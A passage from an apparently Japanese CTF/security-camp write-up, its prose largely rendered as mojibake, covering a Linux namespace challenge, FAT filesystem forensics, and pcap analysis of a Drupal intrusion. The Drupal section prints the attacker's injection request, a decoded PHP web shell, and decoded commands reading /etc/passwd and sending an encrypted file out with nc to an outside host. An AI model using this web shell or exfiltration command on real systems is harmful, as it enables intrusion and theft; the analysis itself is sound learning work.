        <span class=k>if</span> <span class=p>(</span><span class=n>write_file</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s>&#34;deny&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>snprintf</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;/proc/%d/gid_map&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
        <span class=n>snprintf</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;0 %d 1</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>getgid</span><span class=p>());</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>write_file</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>snprintf</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;/proc/%d/uid_map&#34;</span><span class=p>,</span> <span class=n>child</span><span class=p>);</span>
        <span class=n>snprintf</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>STR_BUF_SIZE</span><span class=p>,</span> <span class=s>&#34;0 %d 1</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>getuid</span><span class=p>());</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>write_file</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>isolated_child</span><span class=p>(</span><span class=n>isolated_child_args_t</span><span class=o>*</span> <span class=n>args</span><span class=p>)</span> <span class=p>{</span>
        <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>read</span><span class=p>(</span><span class=n>args</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=c1>//chroot_dir(&#34;/home/minicamp/sandbox/linux-c/camp/sysroot-debian-bullseye&#34;);
</span><span class=c1></span>
<span class=c1>//        child_install_network();
</span><span class=c1></span>

        <span class=kt>char</span><span class=o>*</span> <span class=n>path</span> <span class=o>=</span> <span class=s>&#34;/try_running_me&#34;</span><span class=p>;</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>arg</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
        <span class=kt>char</span><span class=o>*</span> <span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=nb>NULL</span><span class=p>};</span>
        <span class=n>execve</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=n>arg</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
<span class=p>}</span>

<span class=kt>int</span> <span class=nf>start_child</span><span class=p>()</span> <span class=p>{</span>
        <span class=n>isolated_child_args_t</span> <span class=n>args</span><span class=p>;</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=n>fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
        <span class=kt>void</span><span class=o>*</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span>
                <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=o>|</span><span class=n>MAP_GROWSDOWN</span><span class=o>|</span><span class=n>MAP_STACK</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>stack</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>pid_t</span> <span class=n>c</span> <span class=o>=</span> <span class=n>clone</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>isolated_child</span><span class=p>,</span><span class=n>stack</span><span class=o>+</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>CLONE_NEWPID</span><span class=o>|</span><span class=n>CLONE_NEWUSER</span><span class=o>|</span><span class=n>CLONE_NEWNS</span><span class=o>|</span><span class=n>SIGCHLD</span><span class=p>,</span><span class=o>&amp;</span><span class=n>args</span><span class=p>);</span>
        <span class=k>if</span><span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
                <span class=n>puts</span><span class=p>(</span><span class=s>&#34;clone failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: clone</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>write_ug_map</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: map</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
    <span class=c1>//    parent_install_network(c);
</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;</span><span class=se>\0</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: write to pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
        <span class=k>if</span> <span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
  <span class=c1>//      parent_uninstall_network();
</span><span class=c1></span><span class=p>}</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
        <span class=k>return</span> <span class=n>start_child</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></div><p>flag ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚</p>
<pre tabindex=0><code>hooray! you finally made it!
your flag is: mc2021{y0u_l1nux_h4ck3r}
</code></pre><p>flag: <code>mc2021{y0u_l1nux_h4ck3r}</code></p>
<h2 id=è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨>è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨</h2>
<p>unshare ã¨ã„ã†ã‚³ãƒãƒ³ãƒ‰ãŒã‚ã‚Šã€å…ˆã»ã©ã®ç¬¬ä¸€å¼•æ•°ã‚’ <code>""</code> ã¨ã™ã‚‹æ®µéšã®å¾Œã§ã€ãã®ãƒã‚¤ãƒŠãƒªã‚’ <code>main</code> ã¨ã™ã‚‹ã¨</p>
<pre tabindex=0><code>$ unshare -r ./main
</code></pre><p>ã¨ã—ã¦ flag ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨ã„ã†ã‚‚ã®ã§ã—ãŸã€‚(å®Ÿéš›ã«ã‚„ã£ã¦ã¿ã‚‹ã¨ã§ãã¦é©šãã¾ã—ãŸ) <code>unshare(2)</code>ã«ã¤ã„ã¦ã¯ã¾ã ã‚ˆãåˆ†ã‹ã£ã¦ã„ãªã„ã®ã§å¾Œã§èª¿ã¹ã¦ã¿ãŸã„ã¨æ€ã„ã¾ã™ã€‚ã‚³ãƒ³ãƒ†ãƒŠãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã§ã‚‚ <code>unshare(2)</code>ã‚’ç”¨ã„ã¦ namespace ãŒåˆ‡ã‚‰ã‚Œã¦ã„ã‚‹ãã†ã§ã™ã€‚</p>
<h1 id=day1-ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ >DAY1 ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ </h1>
<p>sd ã‚«ãƒ¼ãƒ‰ã®ãƒ€ãƒ³ãƒ—ã‚¤ãƒ¡ãƒ¼ã‚¸ãŒä¸ãˆã‚‰ã‚Œã€ãã®ä¸­ã‹ã‚‰ãƒ•ãƒ©ã‚°ã‚’ç™ºè¦‹ã›ã‚ˆã¨ã„ã†ãƒ•ã‚©ãƒ¬ãƒ³ã‚¸ãƒƒã‚¯ã®å•é¡Œã§ã—ãŸã€‚</p>
<h2 id=æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨-1>æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨</h2>
<p>ã¾ãšåˆæ‰‹ bz2 ã¨ã„ã†æ‹¡å¼µå­ã«æˆ¸æƒ‘ã„ãªãŒã‚‰ã€ãŠã‚Šã‚ƒã¨ <code>bzip2 -dc campfs.bin.bz2 > campfs.bin</code> ã‚’ã—ã¾ã—ãŸã€‚å°‘ã—æ™‚é–“ãŒçµŒã£ã¦ã‹ã‚‰å‡¦ç†ãŒçµ‚ã‚ã‚Šã¾ã™(4GB ã»ã©ã‚ã£ãŸã‚ˆã†ã§ã™)</p>
<p>åˆæ‰‹ <code>strings campfs.bin | grep mc</code> ãªã©ã‚’è©¦ã¿ã¾ã™ãŒã†ã¾ãè¡Œãã¾ã›ã‚“ã€‚(ãã‚Œã¯ãã†) ã—ã‹ã—ã€file ã‚’ã—ã¦ä»¥ä¸‹ã®ã‚ˆã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã§ã‚ã‚‹ã“ã¨ã¯åˆ†ã‹ã‚Šã¾ã—ãŸã€‚</p>
<pre tabindex=0><code>campfs.bin: DOS/MBR boot sector, code offset 0x58+2, OEM-ID &quot;MSWIN4.1&quot;, sectors/cluster 8, Media descriptor 0xf8, sectors/track 63, heads 255, sectors 8388608 (volumes &gt; 32 MB), FAT (32 bit), sectors/FAT 8184, serial number 0x6e2650fe, label: &quot;MINISECCAMP&quot;
</code></pre><p>label ã‚ãŸã‚ŠãŒç²‹ãªæ„Ÿã˜ãŒã—ã¦ãƒ†ãƒ³ã‚·ãƒ§ãƒ³ãŒä¸ŠãŒã‚Šã¾ã™ã­ã€‚</p>
<p>ã“ã“ã§è¬›ç¾©ä¸­ã€ã€Œå®Ÿéš›ã®æ¥­å‹™ã§ã¯ã“ã®ã‚ˆã†ã«æ‰‹ã§èª­ã‚€ã“ã¨ã¯ã»ã¨ã‚“ã©ã‚ã‚Šã¾ã›ã‚“ã€‚ã§ã‚‚ã„ã–ã¨ã„ã†ã¨ãã«ä½¿ãˆã‚‹ã¨å¼·ã„ã€ã¨ã‚ã£ãŸã®ã§ã€ã“ã‚Œã¯æ™‚é–“ã‚‚ãªã„ã—ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ã£ã¦ã¿ãŸæ–¹ãŒã„ã„ã‹ï¼ã¨æ€ã„ãƒ„ãƒ¼ãƒ«æ¢ã—ã®æ—…ã«å‡ºã¾ã™ã€‚(å¾Œã‹ã‚‰åˆ†ã‹ã£ãŸã®ã§ã™ãŒã“ã‚Œã¯æƒ³å®šè§£æ³•ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚åœŸä¸‹åº§)</p>
<p>ã€Œmemory dump forensicsã€ã¨èª¿ã¹ã‚‹ã¨ Volatility ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ãŒã‚ˆã•ãã†ã§ã™ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦å°‘ã—ä½¿ã£ã¦ã¿ã¦ã‚‚åˆ†ã‹ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚<br>
æ¬¡ã«ã€ã€ŒFAT recovery githubã€ã¨ã‹ã§èª¿ã¹ã‚‹ã¨ä»¥ä¸‹ã®ãƒ„ãƒ¼ãƒ«ãŒãƒ’ãƒƒãƒˆã—ã¾ã—ãŸã€‚</p>
<p><a href=https://github.com/Gregwar/fatcat>https://github.com/Gregwar/fatcat</a></p>
<p>ãªã‚“ã‹ã“ã‚Œã‚’ä½¿ã†ã¨ã€</p>
<pre tabindex=0><code>$ ./tool/fatcat/build/fatcat campfs.bin -l /
Listing path /
Directory cluster: 2
f 13/11/2021 14:30:52  _DSC0001.JPG                                       c=3 s=6108843 (5.82585M)
f 13/11/2021 14:30:54  _DSC0003.JPG                                       c=1495 s=7188587 (6.85557M)
f 13/11/2021 14:30:58  _DSC0004.JPG                                       c=3251 s=6729569 (6.41782M)
f 13/11/2021 14:33:20  SECRET.ZIP                                         c=4894 s=6064993 (5.78403M)
</code></pre><p>ã“ã®ã‚ˆã†ã« SECRET.ZIP ãŒè¦‹ãˆã¾ã™ã€‚ã“ã®ã‚ã¨ <code>r</code> ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ç”¨ã„ã¦ SECRET.ZIP ã‚’å–ã‚Šå‡ºã—ã¾ã™ãŒ password ãŒã‹ã‹ã£ã¦ã„ã¦è¦‹ã‚Œã¾ã›ã‚“ã€‚ãã£ã¨ JPG ã®æ–¹ã« password ãŒ 3 åˆ†å‰²ã•ã‚Œã¦æ›¸ã‹ã‚Œã¦ã„ã‚‹ã‚“ã§ã—ã‚‡ã†ï¼å†™çœŸã‚’è¦‹ã¦ã¿ã¾ã™ï¼</p>
<p>YAMAHA ã®ã‚¢ãƒ³ãƒ—ï¼Ÿã®å†™çœŸ<br>
ãƒ«ãƒ¼ã‚¿ã£ã½ã„å†™çœŸ<br>
æ¡ƒé‰„ã®ç”»åƒ</p>
<p>password ãªã„ã‚„ã‚“</p>
<p>ã¨ã„ã†ã‚ã‘ã§æ°—ã‚’å–ã‚Šç›´ã—ã¦ <code>d</code> ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§å‰Šé™¤ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¦ã¿ã¾ã™ã€‚</p>
<pre tabindex=0><code>$ ./tool/fatcat/build/fatcat campfs.bin -d -l /
Listing path /
Directory cluster: 2
f 13/11/2021 14:30:52  _DSC0001.JPG                                       c=3 s=6108843 (5.82585M)
f 13/11/2021 14:30:54  _DSC0003.JPG                                       c=1495 s=7188587 (6.85557M)
f 13/11/2021 14:30:58  _DSC0004.JPG                                       c=3251 s=6729569 (6.41782M)
f 13/11/2021 14:33:20  SECRET.ZIP                                         c=4894 s=6064993 (5.78403M)
f 13/11/2021 14:40:48  ASSWORD.TXT                                        c=6376 s=272 (272B) d
</code></pre><p><code>PASSWORD.TXT</code> ãŒè¦‹ãˆã¾ã™ã€‚ã“ã‚Œã¯è¬›ç¾©ã§æœ€åˆã®æ–‡å­—ãŒåŸ‹ã‚ã‚‰ã‚Œã¦æ¬ ã‘ã¦ã—ã¾ã†ã‚„ã¤ã§ <code>P</code> ãŒæŠœã‘ã¦ã„ã‚‹ã‚“ã§ã—ã‚‡ã†ã€‚FATCAT ã® FAT Undelete Tutorial ã«ã—ãŸãŒã£ã¦ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã™ã‚‹ã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒ’ãƒ³ãƒˆã‚’å¾—ã¾ã™ã€‚</p>
<pre tabindex=0><code>$ ./tool/fatcat/build/fatcat campfs.bin -r ASSWORD.TXT
! Trying to read a deleted file, enabling deleted mode
SECRET.ZIPã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ &quot;CLUSTER_(é–‹å§‹ã‚¯ãƒ©ã‚¹ã‚¿ç•ªå·)_LOCK&quot; ã«ã—ã¦ã¿ã¾ã—ãŸã€‚

ã‚¯ãƒ©ã‚¹ã‚¿ç•ªå·ã¯10é€²æ•°ã§ã™ã€‚
ä¾‹ãˆã° 0x1234 ã ã£ãŸå ´åˆã¯ 4660 ã«ãªã‚Šã¾ã™ã®ã§
CLUSTER_4660_LOCK

ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«ãªã£ã¦ã„ã¾ã™ã€‚
</code></pre><p>ä»Šå›ã ã¨ <code>4894</code> ãŒã‚¯ãƒ©ã‚¹ã‚¿ç•ªå·ã§ã™ã­(<code>c=</code>)ã¨ã„ã†ã‚ã‘ã§ç„¡äº‹ã« ZIP ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ <code>CLUSTER_4894_LOCK</code> ãŒåˆ†ã‹ã‚Šã¾ã—ãŸã€‚<br>
zip ã‚’è§£å‡ã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒç”»åƒã«æ›¸ã‹ã‚Œã¦ã„ã¾ã—ãŸã€‚<br>
flag: <code>ms2021{YOURE_FS_MASTER}</code></p>
<p><code>FS_MASTER</code> ã§ã¯ãªã Tool master ã«ãªã£ã¦ã—ã¾ã£ãŸ&mldr;æœ¬å½“ã«ã”ã‚ã‚“ãªã•ã„(å¾©ç¿’ã—ã¾ã™)</p>
<h2 id=è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨-1>è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨</h2>
<p>è¬›å¸«ã®æ–¹ã¯çœŸé¢ç›®ã«æ‰‹ã§è§£ã„ã¦ã„ãŸã®ã§ã†ãŠï½ç”³ã—è¨³ã­ãˆï½ã¨æ€ã„ãªãŒã‚‰è¦‹ã¦ã„ã¾ã—ãŸã€‚ã¨ã¯ã„ãˆè¬›ç¾©ã§ã‚„ã£ãŸã“ã¨ã‚’ã‚„ã‚Œã°å‰Šé™¤ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã®å¾©å…ƒãªã©ã¯ã™ãã«ã§ããã†ã§ã™ã€‚</p>
<h1 id=day2-ã‚µã‚¤ãƒãƒ¼æ”»æ’ƒå¯¾å¿œå…¥é–€>DAY2 ã‚µã‚¤ãƒãƒ¼æ”»æ’ƒå¯¾å¿œå…¥é–€</h1>
<p>ä»»æ„ã‚³ãƒ¼ãƒ‰å®Ÿè¡ŒãŒã•ã‚ŒãŸæ”»æ’ƒãƒ­ã‚°ã‚’è¦‹ã¦æŒã¡å‡ºã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã®ä¸­ã«ã‚ã‚‹ãƒ•ãƒ©ã‚°ã‚’ pcap ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰è¦‹ã¤ã‘ã‚‹å•é¡Œã§ã—ãŸã€‚</p>
<h2 id=æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨-2>æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨</h2>
<p>ã“ã‚Œã¯ CTF ã® Network ã£ã½ã„ãªã¨æ€ã„ãªãŒã‚‰ http ã§ãƒ•ã‚£ãƒ«ã‚¿ã‚’ã‹ã‘ã¦ Follow HTTP Stream ã‚’ã—ã¦æ€ªã—ã„é€šä¿¡ã‚’è¦‹ã¤ã‘ã¾ã™ã€‚</p>
<pre tabindex=0><code>POST /?q=user/password&amp;name[%23post_render][]=passthru&amp;name[%23type]=markup&amp;name[%23markup]=echo%20PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjJ10pKXsgc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUE9TVFsnYyddKSkpOyB9IA==%20|%20base64%20-d%20%3E%20create.php
</code></pre><p>ã“ã®ã¸ã‚“ã„ã‹ã«ã‚‚ base64 ã—ã¦ create.php ã«æ›¸ãè¾¼ã‚“ã§ shell å¼µã£ã¦ã¾ã™ï¼ã¨ã„ã†æ„Ÿã˜ãŒã—ã¾ã™ã­ï¼CyberChef ã§è©²å½“éƒ¨åˆ†ã‚’ decode ã—ã¾ã™ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span> <span class=nx>system</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])));</span> <span class=p>}</span>
</code></pre></div><p>rot13 ã—ã¦ã‹ã‚‰ base64decode ã—ã¦ã€ãã‚Œã‚’ exec ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚æ”»æ’ƒè€…ã¯ãŠãã‚‰ãã“ã‚Œã‚’ä½¿ã£ã¦ã„ã‚‹ã¯ãšãªã®ã§ã€ã“ã®å¾Œã®é€šä¿¡ã® <code>POST /create.php?</code> ã® <code>c=</code> ã®å¾Œã®æ–‡å­—åˆ—ã‚’ rot13 ã—ã¦ base64decode ã—ã¦ã„ãã¨ã€</p>
<pre tabindex=0><code>cat /etc/passwd
</code></pre><pre tabindex=0><code>openssl aes-256-cbc -e -in flag.txt -out flag.enc -pass pass:change_option_e_to_d_for_decrypt
</code></pre><pre tabindex=0><code>nc -w 2 192.168.180.163 1337 &lt; flag.enc
</code></pre><p>ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚1337 ãƒãƒ¼ãƒˆã®é€šä¿¡ãŒæ°—ã«ãªã‚Šã¾ã™ã€‚<code>tcp.port == 1337</code>ã‚’ã—ã¦ã€Follow TCP Stream ã‚’ã—ã¦ã€1337 å®›ã¦ã®é€šä¿¡ã‚’è¦‹ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒ‡ãƒ¼ã‚¿ãŒå‡ºã¦ãã¾ã™ã€‚</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=c1># ascii</span>
Salted__..&lt;....K............ot5.x..SX........~.h.Y..<span class=o>]</span>.n....!.!..
<span class=c1># raw</span>
53616c7465645f5fafde3cc7d1ab8e4bda00901bbbe2adc913f09faa6f7435d778fd2e5358a6e5b493f1dcffd37ea4688e5983e05dac6ef4a187f7219f21b00e
</code></pre></div><p>ã“ã‚Œã®ãƒã‚¤ãƒŠãƒªãƒ‡ãƒ¼ã‚¿ã‚’å–ã£ã¦ãã¦(ç¢ºã‹ YAML ã«ã—ãŸã‚‰ base64encode ã•ã‚Œã¦ã„ãŸã®ã§ãã‚Œã‚’ä½¿ã£ãŸ)æ‰‹å…ƒã§ä»¥ä¸‹ã®ã‚ˆã†ã«ã™ã‚‹ã¨ flag ãŒæ›¸ã‹ã‚ŒãŸãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚</p>
<pre tabindex=0><code>openssl aes-256-cbc -d -in flag.enc -out flag -pass pass:change_option_e_to_d_for_decrypt
</code></pre><p>flag: <code>mc2021{H4PPY_M1N1C4MP_GR4DU4T10N}</code></p>
<h2 id=è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨-2>è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨</h2>
<p>Drupal ã§ã‚ã‚‹ã“ã¨ã¯ã¡ã‚‰ã£ã¨è¦‹ã¦åˆ†ã‹ã‚Šã¾ã—ãŸãŒæ„è­˜ã‚’ã—ã¦ã„ãªã‹ã£ãŸã®ã§ã€Drupal ã®è„†å¼±æ€§ã§ä»Šå›ä½¿ã‚ã‚Œã¦ã„ã‚‹ã‚‚ã®ã‚’èª¿ã¹ã¦ãŠã“ã†ã¨æ€ã„ã¾ã™ã€‚</p>
<h1 id=day3-ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£-è§£ã‘ãªã‹ã£ãŸ>DAY3 ã‚³ãƒ³ãƒ†ãƒŠã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ (è§£ã‘ãªã‹ã£ãŸ)</h1>
<p>Rego ã§ Gatekeeper ç”¨ã®ãƒãƒªã‚·ãƒ¼ã‚’å®Ÿè£…ã™ã‚‹ã€‚SHA-256 ãƒãƒƒã‚·ãƒ¥å€¤ (ä¾‹: ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2)ã§æŒ‡å®šã•ã‚Œã¦ã„ãªã‘ã‚Œã° reject ã™ã‚‹ã€‚</p>
<h2 id=æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨-3>æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨</h2>
<p>ä»–ã®å•é¡Œã€ç‰¹ã« DAY2 ãƒãƒ«ã‚¦ã‚§ã‚¢ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ†æãƒ»æ¤œçŸ¥ã—ã¦ã¿ã‚ˆã†ãŒä¸€ç”Ÿã†ã¾ãè¡Œã‹ãšã«ã¤ã‚‰ã„ãªã‚ã¨ãªã£ã¦æ™‚é–“ã‚’æ¶ˆè²»ã—ã¦ã„ãŸã®ã§å…¨ãè¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã§ã—ãŸ(ã”ã‚ã‚“ãªã•ã„ ğŸ™‡)</p>
<p>å¾ŒåŠã§å¤§ãƒ’ãƒ³ãƒˆãŒå‡ºé¡Œã•ã‚Œã¦ã€æ­£è¦è¡¨ç¾ã‚²ãƒ¼ãƒ ã«ãªã£ã¦ã„ãŸã®ã§åƒ•ã‚‚ã„ãã¤ã‹æ­£è¦è¡¨ç¾ã‚’æŠ•ã’ã¾ã—ãŸã€‚å•é¡Œæ–‡ã¯å¤§ãƒ’ãƒ³ãƒˆéƒ¨åˆ†ã—ã‹èª­ã‚ã¦ã„ãªã„ã§ã™ã€‚(ã”ã‚ã‚“ãªã•ã„&mldr;)</p>
<p>çµæœã€æƒœã—ã„ã¨ã“ã‚ã¾ã§ã¯è¡Œã£ãŸã‚ˆã†ã§ã™ã€‚</p>
<h2 id=è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨-3>è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨</h2>
<p>æ­£è¦è¡¨ç¾ã ãªã‚ã¨ã„ã†æ°—æŒã¡ã«ãªã£ãŸã®ã§ã€æ­£è¦è¡¨ç¾ã® <code>.*</code> ã¨ <code>.+</code> ã®é•ã„(0 æ–‡å­—ãŒè¨±ã•ã‚Œã‚‹ã‹ã©ã†ã‹)ã‚ãŸã‚Šæ€ã„å‡ºã•ãªã„ã¨ãªã¨æ€ã„ã¾ã—ãŸã€‚ã‚ã¨ SHA256 ã® Docker Image ã«ã¤ã„ã¦ã¯å¤§æ–‡å­—ã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆãŒä½¿ã‚ã‚Œãªã„ã‚“ã§ã™ã­(ãã‚Œã¯ãã†ã‹)<br>
